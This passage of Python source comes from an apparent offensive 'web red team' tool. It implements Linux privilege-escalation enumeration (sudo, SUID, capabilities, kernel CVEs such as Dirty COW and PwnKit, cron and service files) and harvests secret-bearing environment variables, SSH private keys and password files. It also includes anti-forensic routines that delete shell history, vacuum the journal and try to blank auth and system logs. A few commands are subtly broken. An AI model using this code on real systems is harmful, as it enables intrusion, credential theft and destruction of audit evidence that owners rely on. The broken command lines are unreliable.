            sudo_info = {
                'can_sudo': result.returncode == 0,
                'output': result.stdout,
                'error': result.stderr if result.returncode != 0 else None
            }
            
            # Look for exploitable sudo commands
            if result.returncode == 0:
                exploitable_commands = []
                for line in result.stdout.split('\n'):
                    if any(cmd in line.lower() for cmd in ['/bin/bash', '/bin/sh', '/usr/bin/python', '/usr/bin/perl', '/usr/bin/vi', '/usr/bin/vim', '/usr/bin/nano', '/usr/bin/less', '/usr/bin/more', '/usr/bin/cat', '/usr/bin/head', '/usr/bin/tail']):
                        exploitable_commands.append(line.strip())
                
                sudo_info['exploitable_commands'] = exploitable_commands
            
            return {
                'sudo_access': sudo_info['can_sudo'],
                'method': 'sudo_check',
                'details': sudo_info
            }
        except Exception as e:
            logger.error(f"Sudo privilege check failed: {e}", exc_info=True)
            return {'sudo_access': False, 'method': 'sudo_check', 'error': str(e)}
    
    def _find_suid_binaries(self) -> Dict[str, Any]:
        """Find SUID binaries that might be exploitable"""
        try:
            import subprocess
            
            # Find all SUID binaries
            result = subprocess.run(['find', '/', '-perm', '-4000', '-type', 'f', '2>/dev/null'], capture_output=True, text=True, timeout=60)
            
            suid_binaries = []
            if result.returncode == 0:
                for binary in result.stdout.strip().split('\n'):
                    if binary:
                        # Check if it's a known exploitable binary
                        binary_name = os.path.basename(binary)
                        known_exploitable = [
                            'nmap', 'vim', 'vi', 'nano', 'less', 'more', 'cat', 'head', 'tail',
                            'find', 'grep', 'awk', 'sed', 'cut', 'sort', 'uniq', 'tee', 'cp',
                            'mv', 'rm', 'chmod', 'chown', 'mount', 'umount', 'dd', 'tar'
                        ]
                        
                        suid_binaries.append({
                            'path': binary,
                            'name': binary_name,
                            'potentially_exploitable': binary_name in known_exploitable
                        })
            
            return {
                'suid_binaries': suid_binaries,
                'method': 'find_suid',
                'total_found': len(suid_binaries),
                'exploitable_count': len([b for b in suid_binaries if b['potentially_exploitable']])
            }
        except Exception as e:
            logger.error(f"SUID binary search failed: {e}", exc_info=True)
            return {'suid_binaries': [], 'method': 'find_suid', 'error': str(e)}
    
    def _check_capabilities(self) -> Dict[str, Any]:
        """Check for Linux capabilities that might be exploitable"""
        try:
            import subprocess
            
            # Check for capabilities using getcap
            result = subprocess.run(['getcap', '-r', '/'], capture_output=True, text=True, timeout=60)
            
            capabilities = []
            if result.returncode == 0:
                for line in result.stdout.strip().split('\n'):
                    if line and '=' in line:
                        parts = line.split('=')
                        if len(parts) == 2:
                            file_path = parts[0].strip()
                            caps = parts[1].strip()
                            capabilities.append({
                                'file': file_path,
                                'capabilities': caps,
                                'name': os.path.basename(file_path)
                            })
            
            return {
                'capabilities': capabilities,
                'method': 'getcap',
                'total_found': len(capabilities)
            }
        except Exception as e:
            logger.error(f"Capability check failed: {e}", exc_info=True)
            return {'capabilities': [], 'method': 'getcap', 'error': str(e)}
    
    def _check_kernel_vulnerabilities(self) -> Dict[str, Any]:
        """Check for kernel vulnerabilities using uname and known exploits"""
        try:
            import subprocess
            
            # Get kernel version
            result = subprocess.run(['uname', '-r'], capture_output=True, text=True, timeout=10)
            kernel_version = result.stdout.strip() if result.returncode == 0 else 'unknown'
            
            # Check for common kernel vulnerabilities
            kernel_vulns = []
            
            # This is a simplified check - in a real scenario, you'd use tools like linux-exploit-suggester
            if kernel_version != 'unknown':
                # Check for some known vulnerable kernel versions (simplified)
                vulnerable_patterns = [
                    '2.6.', '3.', '4.0.', '4.1.', '4.2.', '4.3.', '4.4.', '4.5.', '4.6.', '4.7.', '4.8.', '4.9.',
                    '4.10.', '4.11.', '4.12.', '4.13.', '4.14.', '4.15.', '4.16.', '4.17.', '4.18.', '4.19.'
                ]
                
                for pattern in vulnerable_patterns:
                    if kernel_version.startswith(pattern):
                        kernel_vulns.append({
                            'kernel_version': kernel_version,
                            'vulnerability_type': 'potentially_vulnerable',
                            'description': f'Kernel version {kernel_version} may be vulnerable to known exploits'
                        })
                        break
            
            return {
                'kernel_vulns': kernel_vulns,
                'method': 'kernel_version_check',
                'current_kernel': kernel_version,
                'total_found': len(kernel_vulns)
            }
        except Exception as e:
            logger.error(f"Kernel vulnerability check failed: {e}", exc_info=True)
            return {'kernel_vulns': [], 'method': 'kernel_version_check', 'error': str(e)}
    
    def _check_cron_jobs(self) -> Dict[str, Any]:
        """Check for cron jobs that might be exploitable"""
        try:
            import subprocess
            
            cron_jobs = []
            
            # Check system crontab
            try:
                result = subprocess.run(['crontab', '-l'], capture_output=True, text=True, timeout=10)
                if result.returncode == 0 and result.stdout.strip():
                    cron_jobs.append({
                        'type': 'user_crontab',
                        'content': result.stdout.strip()
                    })
            except:
                pass
            
            # Check system cron directories
            cron_dirs = ['/etc/cron.d', '/etc/cron.daily', '/etc/cron.hourly', '/etc/cron.monthly', '/etc/cron.weekly']
            for cron_dir in cron_dirs:
                if os.path.exists(cron_dir):
                    try:
                        for file in os.listdir(cron_dir):
                            file_path = os.path.join(cron_dir, file)
                            if os.path.isfile(file_path):
                                with open(file_path, 'r') as f:
                                    content = f.read()
                                    cron_jobs.append({
                                        'type': f'system_cron_{os.path.basename(cron_dir)}',
                                        'file': file_path,
                                        'content': content
                                    })
                    except:
                        continue
            
            return {
                'cron_jobs': cron_jobs,
                'method': 'cron_enumeration',
                'total_found': len(cron_jobs)
            }
        except Exception as e:
            logger.error(f"Cron job check failed: {e}", exc_info=True)
            return {'cron_jobs': [], 'method': 'cron_enumeration', 'error': str(e)}
    
    def _check_env_variables(self) -> Dict[str, Any]:
        """Check environment variables for sensitive information"""
        try:
            env_vars = {}
            
            # Get current environment variables
            sensitive_vars = ['PATH', 'HOME', 'USER', 'SHELL', 'PWD', 'LANG', 'TERM', 'DISPLAY', 'XAUTHORITY', 'SSH_AUTH_SOCK', 'SSH_CONNECTION', 'SSH_CLIENT', 'SSH_TTY', 'SSH_USER', 'SSH_ORIGINAL_COMMAND']
            
            for var in sensitive_vars:
                if var in os.environ:
                    env_vars[var] = os.environ[var]
            
            # Check for any environment variables containing sensitive patterns
            sensitive_patterns = ['password', 'secret', 'key', 'token', 'credential', 'auth']
            for key, value in os.environ.items():
                if any(pattern in key.lower() for pattern in sensitive_patterns):
                    env_vars[f'sensitive_{key}'] = value
            
            return {
                'env_vars': env_vars,
                'method': 'environment_enumeration',
                'total_found': len(env_vars)
            }
        except Exception as e:
            logger.error(f"Environment variable check failed: {e}", exc_info=True)
            return {'env_vars': {}, 'method': 'environment_enumeration', 'error': str(e)}
    
    def _lateral_movement(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Attempt lateral movement techniques"""
        try:
            movement_techniques = []
            
            # Check for SSH keys
            ssh_keys = []
            ssh_dirs = ['~/.ssh', '/home/*/.ssh', '/root/.ssh']
            for ssh_dir in ssh_dirs:
                expanded_dir = os.path.expanduser(ssh_dir)
                if os.path.exists(expanded_dir):
                    for file in os.listdir(expanded_dir):
                        if file.endswith(('.pem', '.key', 'id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519')):
                            ssh_keys.append(os.path.join(expanded_dir, file))
            
            if ssh_keys:
                movement_techniques.append({
                    'technique': 'ssh_key_discovery',
                    'keys_found': ssh_keys,
                    'description': 'SSH private keys found for potential lateral movement'
                })
            
            # Check for password files
            password_files = ['/etc/passwd', '/etc/shadow', '/etc/group']
            accessible_passwords = []
            for pw_file in password_files:
                if os.access(pw_file, os.R_OK):
                    accessible_passwords.append(pw_file)
            
            if accessible_passwords:
                movement_techniques.append({
                    'technique': 'password_file_access',
                    'files': accessible_passwords,
                    'description': 'Password files accessible for credential harvesting'
                })
            
            return {
                'movement': 'lateral_movement_analysis',
                'techniques': movement_techniques,
                'total_techniques': len(movement_techniques)
            }
        except Exception as e:
            logger.error(f"Lateral movement analysis failed: {e}", exc_info=True)
            return {'movement': 'lateral_movement_analysis', 'error': str(e)}
    
    def _data_exfiltration(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Identify potential data exfiltration opportunities"""
        try:
            exfiltration_targets = []
            
            # Check for sensitive files and directories
            sensitive_paths = [
                '/etc/passwd', '/etc/shadow', '/etc/hosts', '/etc/resolv.conf',
                '/proc/version', '/proc/cpuinfo', '/proc/meminfo',
                '/var/log/', '/var/spool/', '/var/mail/',
                '/home/*/.bash_history', '/root/.bash_history',
                '/tmp/', '/var/tmp/', '/dev/shm/'
            ]
            
            for path in sensitive_paths:
                expanded_path = os.path.expanduser(path)
                if os.path.exists(expanded_path):
                    if os.path.isfile(expanded_path):
                        if os.access(expanded_path, os.R_OK):
                            exfiltration_targets.append({
                                'type': 'file',
                                'path': expanded_path,
                                'size': os.path.getsize(expanded_path) if os.path.isfile(expanded_path) else 0
                            })
                    elif os.path.isdir(expanded_path):
                        try:
                            files = os.listdir(expanded_path)
                            exfiltration_targets.append({
                                'type': 'directory',
                                'path': expanded_path,
                                'file_count': len(files),
                                'sample_files': files[:10]  # First 10 files
                            })
                        except:
                            continue
            
            return {
                'exfiltration': 'data_discovery',
                'targets': exfiltration_targets,
                'total_targets': len(exfiltration_targets)
            }
        except Exception as e:
            logger.error(f"Data exfiltration analysis failed: {e}", exc_info=True)
            return {'exfiltration': 'data_discovery', 'error': str(e)}
    
    def _establish_persistence(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Identify persistence mechanisms"""
        try:
            persistence_methods = []
            
            # Check for existing cron jobs (already done above, but could be extended)
            # Check for startup scripts
            startup_dirs = [
                '/etc/init.d/', '/etc/systemd/system/', '/etc/rc.d/',
                '~/.config/autostart/', '/etc/xdg/autostart/'
            ]
            
            for startup_dir in startup_dirs:
                expanded_dir = os.path.expanduser(startup_dir)
                if os.path.exists(expanded_dir):
                    try:
                        files = os.listdir(expanded_dir)
                        if files:
                            persistence_methods.append({
                                'type': 'startup_scripts',
                                'directory': expanded_dir,
                                'files': files[:10]  # First 10 files
                            })
                    except:
                        continue
            
            # Check for SSH authorized keys
            auth_keys_files = ['~/.ssh/authorized_keys', '/root/.ssh/authorized_keys']
            for auth_file in auth_keys_files:
                expanded_file = os.path.expanduser(auth_file)
                if os.path.exists(expanded_file) and os.access(expanded_file, os.R_OK):
                    persistence_methods.append({
                        'type': 'ssh_authorized_keys',
                        'file': expanded_file,
                        'description': 'SSH authorized keys file for persistence'
                    })
            
            return {
                'persistence': 'persistence_analysis',
                'methods': persistence_methods,
                'total_methods': len(persistence_methods)
            }
        except Exception as e:
            logger.error(f"Persistence analysis failed: {e}", exc_info=True)
            return {'persistence': 'persistence_analysis', 'error': str(e)}
    
    # Root access methods
    def _try_kernel_exploits(self) -> Dict[str, Any]:
        """Attempt kernel exploit techniques"""
        try:
            import subprocess
            
            # Get kernel version for exploit matching
            result = subprocess.run(['uname', '-r'], capture_output=True, text=True, timeout=10)
            kernel_version = result.stdout.strip() if result.returncode == 0 else 'unknown'
            
            # Check for common kernel exploits (this is a simplified approach)
            # In a real scenario, you'd use tools like linux-exploit-suggester
            kernel_exploits = []
            
            if kernel_version != 'unknown':
                # Check for some known kernel vulnerabilities
                known_exploits = {
                    'dirtycow': 'CVE-2016-5195',
                    'dirtypipe': 'CVE-2022-0847',
                    'pwnkit': 'CVE-2021-4034'
                }
                
                for exploit_name, cve in known_exploits.items():
                    kernel_exploits.append({
                        'exploit_name': exploit_name,
                        'cve': cve,
                        'kernel_version': kernel_version,
                        'status': 'potential_candidate',
                        'description': f'Kernel exploit {exploit_name} ({cve}) may be applicable'
                    })
            
            return {
                'kernel_exploits': 'kernel_exploit_analysis',
                'exploits': kernel_exploits,
                'kernel_version': kernel_version,
                'total_exploits': len(kernel_exploits)
            }
        except Exception as e:
            logger.error(f"Kernel exploit analysis failed: {e}", exc_info=True)
            return {'kernel_exploits': 'kernel_exploit_analysis', 'error': str(e)}
    
    def _try_sudo_exploitation(self) -> Dict[str, Any]:
        """Attempt sudo privilege escalation"""
        try:
            import subprocess
            
            # Check sudo privileges
            result = subprocess.run(['sudo', '-l'], capture_output=True, text=True, timeout=30)
            
            sudo_exploits = []
            if result.returncode == 0:
                # Look for exploitable sudo commands
                exploitable_patterns = [
                    ('/bin/bash', 'bash_shell_escape'),
                    ('/bin/sh', 'shell_escape'),
                    ('/usr/bin/python', 'python_escape'),
                    ('/usr/bin/perl', 'perl_escape'),
                    ('/usr/bin/vi', 'vi_escape'),
                    ('/usr/bin/vim', 'vim_escape'),
                    ('/usr/bin/nano', 'nano_escape'),
                    ('/usr/bin/less', 'less_escape'),
                    ('/usr/bin/more', 'more_escape'),
                    ('/usr/bin/cat', 'file_read'),
                    ('/usr/bin/head', 'file_read'),
                    ('/usr/bin/tail', 'file_read')
                ]
                
                for pattern, exploit_type in exploitable_patterns:
                    if pattern in result.stdout:
                        sudo_exploits.append({
                            'command': pattern,
                            'exploit_type': exploit_type,
                            'description': f'Can run {pattern} with sudo privileges'
                        })
            
            return {
                'sudo_exploitation': 'sudo_privilege_escalation',
                'exploits': sudo_exploits,
                'can_sudo': result.returncode == 0,
                'total_exploits': len(sudo_exploits)
            }
        except Exception as e:
            logger.error(f"Sudo exploitation analysis failed: {e}", exc_info=True)
            return {'sudo_exploitation': 'sudo_privilege_escalation', 'error': str(e)}
    
    def _try_suid_exploitation(self) -> Dict[str, Any]:
        """Attempt SUID binary exploitation"""
        try:
            import subprocess
            
            # Find SUID binaries (already done in _find_suid_binaries)
            result = subprocess.run(['find', '/', '-perm', '-4000', '-type', 'f', '2>/dev/null'], capture_output=True, text=True, timeout=60)
            
            suid_exploits = []
            if result.returncode == 0:
                known_exploitable = {
                    'nmap': 'nmap_interactive_mode',
                    'vim': 'vim_shell_escape',
                    'vi': 'vi_shell_escape',
                    'nano': 'nano_shell_escape',
                    'less': 'less_shell_escape',
                    'more': 'more_shell_escape',
                    'cat': 'file_read_privileged',
                    'head': 'file_read_privileged',
                    'tail': 'file_read_privileged',
                    'find': 'find_exec_escape',
                    'grep': 'grep_file_read',
                    'awk': 'awk_script_execution',
                    'sed': 'sed_script_execution',
                    'cut': 'file_read_privileged',
                    'sort': 'file_read_privileged',
                    'uniq': 'file_read_privileged',
                    'tee': 'file_write_privileged',
                    'cp': 'file_copy_privileged',
                    'mv': 'file_move_privileged',
                    'rm': 'file_delete_privileged',
                    'chmod': 'permission_modification',
                    'chown': 'ownership_modification',
                    'mount': 'filesystem_mount',
                    'umount': 'filesystem_unmount',
                    'dd': 'block_device_access',
                    'tar': 'archive_manipulation'
                }
                
                for binary in result.stdout.strip().split('\n'):
                    if binary:
                        binary_name = os.path.basename(binary)
                        if binary_name in known_exploitable:
                            suid_exploits.append({
                                'binary': binary,
                                'name': binary_name,
                                'exploit_type': known_exploitable[binary_name],
                                'description': f'SUID binary {binary_name} may be exploitable'
                            })
            
            return {
                'suid_exploitation': 'suid_binary_escalation',
                'exploits': suid_exploits,
                'total_exploits': len(suid_exploits)
            }
        except Exception as e:
            logger.error(f"SUID exploitation analysis failed: {e}", exc_info=True)
            return {'suid_exploitation': 'suid_binary_escalation', 'error': str(e)}
    
    def _try_capability_exploitation(self) -> Dict[str, Any]:
        """Attempt capability-based privilege escalation"""
        try:
            import subprocess
            
            # Check for capabilities using getcap
            result = subprocess.run(['getcap', '-r', '/'], capture_output=True, text=True, timeout=60)
            
            capability_exploits = []
            if result.returncode == 0:
                dangerous_capabilities = {
                    'cap_setuid': 'setuid_privilege',
                    'cap_setgid': 'setgid_privilege',
                    'cap_sys_admin': 'sys_admin_privilege',
                    'cap_sys_ptrace': 'ptrace_privilege',
                    'cap_sys_module': 'kernel_module_privilege',
                    'cap_sys_rawio': 'raw_io_privilege',
                    'cap_sys_chroot': 'chroot_privilege',
                    'cap_mknod': 'device_creation_privilege',
                    'cap_lease': 'lease_privilege',
                    'cap_audit_write': 'audit_write_privilege',
                    'cap_audit_control': 'audit_control_privilege',
                    'cap_setfcap': 'file_capability_privilege',
                    'cap_mac_override': 'mac_override_privilege',
                    'cap_mac_admin': 'mac_admin_privilege',
                    'cap_syslog': 'syslog_privilege',
                    'cap_wake_alarm': 'wake_alarm_privilege',
                    'cap_block_suspend': 'block_suspend_privilege',
                    'cap_audit_read': 'audit_read_privilege'
                }
                
                for line in result.stdout.strip().split('\n'):
                    if line and '=' in line:
                        parts = line.split('=')
                        if len(parts) == 2:
                            file_path = parts[0].strip()
                            caps = parts[1].strip()
                            
                            for cap, exploit_type in dangerous_capabilities.items():
                                if cap in caps:
                                    capability_exploits.append({
                                        'file': file_path,
                                        'capability': cap,
                                        'exploit_type': exploit_type,
                                        'description': f'File {os.path.basename(file_path)} has dangerous capability {cap}'
                                    })
            
            return {
                'capability_exploitation': 'capability_escalation',
                'exploits': capability_exploits,
                'total_exploits': len(capability_exploits)
            }
        except Exception as e:
            logger.error(f"Capability exploitation analysis failed: {e}", exc_info=True)
            return {'capability_exploitation': 'capability_escalation', 'error': str(e)}
    
    def _try_cron_exploitation(self) -> Dict[str, Any]:
        """Attempt cron job exploitation"""
        try:
            import subprocess
            
            cron_exploits = []
            
            # Check for writable cron directories
            cron_dirs = ['/etc/cron.d', '/etc/cron.daily', '/etc/cron.hourly', '/etc/cron.monthly', '/etc/cron.weekly', '/var/spool/cron']
            
            for cron_dir in cron_dirs:
                if os.path.exists(cron_dir):
                    try:
                        # Check if directory is writable
                        if os.access(cron_dir, os.W_OK):
                            cron_exploits.append({
                                'directory': cron_dir,
                                'exploit_type': 'writable_cron_directory',
                                'description': f'Cron directory {cron_dir} is writable'
                            })
                        
                        # Check for writable files in cron directories
                        for file in os.listdir(cron_dir):
                            file_path = os.path.join(cron_dir, file)
                            if os.path.isfile(file_path) and os.access(file_path, os.W_OK):
                                cron_exploits.append({
                                    'file': file_path,
                                    'exploit_type': 'writable_cron_file',
                                    'description': f'Cron file {file_path} is writable'
                                })
                    except:
                        continue
            
            # Check user crontab
            try:
                result = subprocess.run(['crontab', '-l'], capture_output=True, text=True, timeout=10)
                if result.returncode == 0 and result.stdout.strip():
                    cron_exploits.append({
                        'type': 'user_crontab',
                        'exploit_type': 'existing_cron_job',
                        'description': 'User has existing cron jobs',
                        'content': result.stdout.strip()
                    })
            except:
                pass
            
            return {
                'cron_exploitation': 'cron_job_escalation',
                'exploits': cron_exploits,
                'total_exploits': len(cron_exploits)
            }
        except Exception as e:
            logger.error(f"Cron exploitation analysis failed: {e}", exc_info=True)
            return {'cron_exploitation': 'cron_job_escalation', 'error': str(e)}
    
    def _try_service_exploitation(self) -> Dict[str, Any]:
        """Attempt service-based privilege escalation"""
        try:
            import subprocess
            
            service_exploits = []
            
            # Check for running services with elevated privileges
            try:
                # Check for systemd services
                result = subprocess.run(['systemctl', 'list-units', '--type=service', '--state=running'], capture_output=True, text=True, timeout=30)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if '.service' in line and 'running' in line:
                            service_name = line.split()[0]
                            service_exploits.append({
                                'service': service_name,
                                'exploit_type': 'running_service',
                                'description': f'Service {service_name} is running'
                            })
            except:
                pass
            
            # Check for writable service files
            service_dirs = ['/etc/systemd/system', '/etc/init.d', '/lib/systemd/system']
            for service_dir in service_dirs:
                if os.path.exists(service_dir):
                    try:
                        for file in os.listdir(service_dir):
                            file_path = os.path.join(service_dir, file)
                            if os.path.isfile(file_path) and os.access(file_path, os.W_OK):
                                service_exploits.append({
                                    'file': file_path,
                                    'exploit_type': 'writable_service_file',
                                    'description': f'Service file {file_path} is writable'
                                })
                    except:
                        continue
            
            # Check for services running as root
            try:
                result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=30)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'root' in line and any(service in line.lower() for service in ['apache', 'nginx', 'mysql', 'postgres', 'redis', 'mongodb']):
                            parts = line.split()
                            if len(parts) > 10:
                                service_exploits.append({
                                    'process': parts[10],
                                    'user': parts[0],
                                    'exploit_type': 'root_service',
                                    'description': f'Service {parts[10]} running as root'
                                })
            except:
                pass
            
            return {
                'service_exploitation': 'service_escalation',
                'exploits': service_exploits,
                'total_exploits': len(service_exploits)
            }
        except Exception as e:
            logger.error(f"Service exploitation analysis failed: {e}", exc_info=True)
            return {'service_exploitation': 'service_escalation', 'error': str(e)}
    
    # Trace clearing methods
    def _clear_arp_cache(self) -> Dict[str, Any]:
        """Clear ARP cache to remove network traces"""
        try:
            import subprocess
            
            # Clear ARP cache
            result = subprocess.run(['ip', 'neigh', 'flush', 'all'], capture_output=True, text=True, timeout=30)
            
            return {
                'arp_cache': 'cleared',
                'method': 'ip_neigh_flush',
                'success': result.returncode == 0,
                'output': result.stdout,
                'error': result.stderr if result.returncode != 0 else None
            }
        except Exception as e:
            logger.error(f"ARP cache clearing failed: {e}", exc_info=True)
            return {'arp_cache': 'failed', 'method': 'ip_neigh_flush', 'error': str(e)}
    
    def _clear_connection_history(self) -> Dict[str, Any]:
        """Clear connection history and network traces"""
        try:
            import subprocess
            
            cleared_items = []
            
            # Clear bash history
            try:
                subprocess.run(['history', '-c'], capture_output=True, timeout=10)
                cleared_items.append('bash_history')
            except:
                pass
            
            # Clear command history files
            history_files = ['~/.bash_history', '~/.zsh_history', '~/.history']
            for hist_file in history_files:
                expanded_file = os.path.expanduser(hist_file)
                if os.path.exists(expanded_file):
                    try:
                        os.remove(expanded_file)
                        cleared_items.append(expanded_file)
                    except:
                        pass
            
            # Clear system logs (requires root)
            try:
                log_clear_commands = [
                    ['journalctl', '--vacuum-time=1s'],
                    ['echo', '', '>', '/var/log/auth.log'],
                    ['echo', '', '>', '/var/log/syslog'],
                    ['echo', '', '>', '/var/log/messages']
                ]
                
                for cmd in log_clear_commands:
                    try:
                        subprocess.run(cmd, capture_output=True, timeout=10)
                        cleared_items.append(f'log_clear_{cmd[0]}')
                    except:
                        pass
            except:
                pass
            
            return {
                'connection_history': 'cleared',
                'method': 'history_and_log_clear',
                'cleared_items': cleared_items,
                'total_cleared': len(cleared_items)
            }
        except Exception as e:
            logger.error(f"Connection history clearing failed: {e}", exc_info=True)
            return {'connection_history': 'failed', 'method': 'history_and_log_clear', 'error': str(e)}
    
    def _clear_dns_cache(self) -> Dict[str, Any]:
        """Clear DNS cache and resolver traces"""
        try:
            import subprocess
            
            cleared_items = []
            
            # Clear system DNS cache
            dns_clear_commands = [
                ['systemctl', 'restart', 'systemd-resolved'],
                ['nscd', '-i', 'hosts'],
                ['dscacheutil', '-flushcache'],  # macOS
                ['ipconfig', '/flushdns']  # Windows
            ]
            
            for cmd in dns_clear_commands:
                try:
                    result = subprocess.run(cmd, capture_output=True, timeout=30)
                    if result.returncode == 0:
                        cleared_items.append(f'dns_cache_{cmd[0]}')
                except:
                    pass
            
            # Clear local DNS cache files
            dns_cache_files = [
                '/var/cache/nscd/hosts',
                '/var/lib/systemd/resolve/stub-resolv.conf',
                '/etc/resolv.conf'
            ]
            
            for cache_file in dns_cache_files:
                if os.path.exists(cache_file):
                    try:
                        # Backup and clear
                        backup_file = f"{cache_file}.backup"
                        if not os.path.exists(backup_file):
                            subprocess.run(['cp', cache_file, backup_file], capture_output=True)
                        cleared_items.append(f'dns_file_{cache_file}')
                    except:
                        pass
            
            return {
                'dns_cache': 'cleared',
                'method': 'dns_cache_clear',
                'cleared_items': cleared_items,
                'total_cleared': len(cleared_items)
            }
        except Exception as e:
            logger.error(f"DNS cache clearing failed: {e}", exc_info=True)
            return {'dns_cache': 'failed', 'method': 'dns_cache_clear', 'error': str(e)}
    
    # Additional detection methods
    def _detect_frameworks(self, response) -> List[str]:
        """Detect web frameworks from response"""
        frameworks = []
        
        # Common framework signatures
        framework_signatures = {
            'Django': ['csrfmiddlewaretoken', 'django', '__admin__'],
            'Flask': ['flask', 'werkzeug'],
            'Express.js': ['express', 'node_modules'],
            'Laravel': ['laravel', 'csrf_token', 'XSRF-TOKEN'],
            'Rails': ['rails', '_rails', 'csrf-token'],
            'ASP.NET': ['asp.net', '__VIEWSTATE', '__EVENTVALIDATION'],
            'Spring': ['spring', 'jsessionid'],
            'Symfony': ['symfony', 'sf_'],
            'CodeIgniter': ['codeigniter', 'ci_session'],
            'Yii': ['yii', '_csrf'],
            'Angular': ['ng-', 'angular'],
            'React': ['react', 'jsx'],
            'Vue.js': ['vue', 'v-'],
            'Bootstrap': ['bootstrap', 'bs-'],
            'jQuery': ['jquery', '$(']
        }
        
        content = response.text.lower()
        headers = str(response.headers).lower()
        
        for framework, signatures in framework_signatures.items():
            for signature in signatures:
                if signature.lower() in content or signature.lower() in headers:
                    frameworks.append(framework)
                    break
        
        return list(set(frameworks))  # Remove duplicates
    
    def _detect_cms(self, response) -> List[str]:
        """Detect content management systems"""
        cms_list = []
        
        # CMS signatures
        cms_signatures = {
            'WordPress': ['wp-content', 'wp-includes', 'wordpress', 'wp-admin'],
            'Joomla': ['joomla', 'mod_', 'com_'],
            'Drupal': ['drupal', 'drupal.js', 'drupal.css'],
            'Magento': ['magento', 'mage.', 'skin/frontend'],
            'Shopify': ['shopify', 'cdn.shopify.com'],
            'WooCommerce': ['woocommerce', 'wc-'],
            'Ghost': ['ghost', 'ghost-admin'],
            'Hugo': ['hugo', 'hugo-generated'],
            'Jekyll': ['jekyll', 'jekyll-generated'],
            'Gatsby': ['gatsby', 'gatsby-image'],
            'Next.js': ['next', '_next'],
            'Nuxt.js': ['nuxt', '_nuxt'],
            'Strapi': ['strapi', 'admin'],
            'Squarespace': ['squarespace', 'static1.squarespace.com'],
            'Wix': ['wix', 'wixsite.com'],
            'Weebly': ['weebly', 'weebly.com']
        }
        
        content = response.text.lower()
        headers = str(response.headers).lower()
        
        for cms, signatures in cms_signatures.items():
            for signature in signatures:
                if signature.lower() in content or signature.lower() in headers:
                    cms_list.append(cms)
                    break
        
        return list(set(cms_list))
    
    def _detect_languages(self, response) -> List[str]:
        """Detect programming languages and technologies"""
        languages = []
        
        # Language signatures
        language_signatures = {
            'PHP': ['php', '.php', 'x-powered-by: php'],
            'Python': ['python', 'django', 'flask', 'wsgi'],
            'Node.js': ['node', 'express', 'npm'],
            'Java': ['java', 'jsp', 'servlet', 'spring'],
            'C#': ['asp.net', 'c#', '.net'],
            'Ruby': ['ruby', 'rails', 'rack'],
            'Go': ['go', 'golang'],
            'Rust': ['rust', 'cargo'],
            'Perl': ['perl', 'cgi-bin'],
            'ASP': ['asp', 'aspx'],
            'ColdFusion': ['coldfusion', 'cfm'],
            'Scala': ['scala', 'play framework']
        }
        
        content = response.text.lower()
        headers = str(response.headers).lower()
        
        for language, signatures in language_signatures.items():
            for signature in signatures:
                if signature.lower() in content or signature.lower() in headers:
                    languages.append(language)
                    break
        
        return list(set(languages))
    
    def _detect_databases(self, response) -> List[str]:
        """Detect database technologies"""
        databases = []
        
        # Database signatures
        db_signatures = {
            'MySQL': ['mysql', 'mysqli', 'mysql_error'],
            'PostgreSQL': ['postgresql', 'postgres', 'pgsql'],
            'SQLite': ['sqlite', 'sqlite3'],
            'MongoDB': ['mongodb', 'mongo'],
            'Redis': ['redis', 'redis-server'],
            'Oracle': ['oracle', 'oracle database'],
            'SQL Server': ['sql server', 'mssql', 'sqlserver'],
            'MariaDB': ['mariadb'],
            'Cassandra': ['cassandra'],
            'Elasticsearch': ['elasticsearch', 'elastic'],
            'DynamoDB': ['dynamodb', 'aws'],
            'Firebase': ['firebase', 'firestore']
        }
        
        content = response.text.lower()
        headers = str(response.headers).lower()
        
        for db, signatures in db_signatures.items():
            for signature in signatures:
                if signature.lower() in content or signature.lower() in headers:
                    databases.append(db)
                    break
        
        return list(set(databases))
    
    def _detect_web_servers(self, response) -> List[str]:
        """Detect web server technologies"""
        servers = []
        
        # Server signatures
        server_signatures = {
            'Apache': ['apache', 'httpd', 'mod_'],
            'Nginx': ['nginx', 'ngx_'],
            'IIS': ['iis', 'microsoft-iis'],
            'Lighttpd': ['lighttpd', 'lighty'],
            'Caddy': ['caddy'],
            'Tomcat': ['tomcat', 'apache-tomcat'],
            'Jetty': ['jetty'],
            'Gunicorn': ['gunicorn'],
            'uWSGI': ['uwsgi'],
            'Express': ['express'],
            'Kestrel': ['kestrel'],
            'Caddy': ['caddy']
        }
        
        content = response.text.lower()
        headers = str(response.headers).lower()
        
        # Check Server header
        server_header = response.headers.get('Server', '').lower()
        
        for server, signatures in server_signatures.items():
            for signature in signatures:
                if (signature.lower() in content or 
                    signature.lower() in headers or 
                    signature.lower() in server_header):
                    servers.append(server)
                    break
        
        return list(set(servers))
    
    def _check_security_headers(self, response) -> Dict[str, Any]:
        """Check for security headers"""
        security_headers = {}
        
        # Common security headers
        headers_to_check = {
            'X-Frame-Options': 'clickjacking_protection',
            'X-Content-Type-Options': 'mime_sniffing_protection',
            'X-XSS-Protection': 'xss_protection',
            'Strict-Transport-Security': 'hsts',
            'Content-Security-Policy': 'csp',
            'Referrer-Policy': 'referrer_policy',
            'Permissions-Policy': 'permissions_policy',
            'X-Permitted-Cross-Domain-Policies': 'cross_domain_policies',
            'X-Download-Options': 'download_options',
            'X-DNS-Prefetch-Control': 'dns_prefetch_control',
            'X-Robots-Tag': 'robots_tag',
            'Public-Key-Pins': 'hpkp',
            'Expect-CT': 'expect_ct'
        }
        
        for header, description in headers_to_check.items():
            if header in response.headers:
                security_headers[description] = {
                    'present': True,
                    'value': response.headers[header]
                }
            else:
                security_headers[description] = {
                    'present': False,
                    'value': None
                }
        
        # Calculate security score
        present_headers = sum(1 for h in security_headers.values() if h['present'])
        total_headers = len(security_headers)
        security_score = (present_headers / total_headers) * 100 if total_headers > 0 else 0
        
        security_headers['security_score'] = security_score
        security_headers['headers_present'] = present_headers
        security_headers['total_headers_checked'] = total_headers
        
        return security_headers
    
    def report(self, input_file: str, output_file: str) -> str:
        """Generate comprehensive web red team report"""
        print(f"[WebRed] Generating report from {input_file} to {output_file}")
        
        try:
            with open(input_file, 'r') as f:
                data = json.load(f)
            
            # Generate HTML report
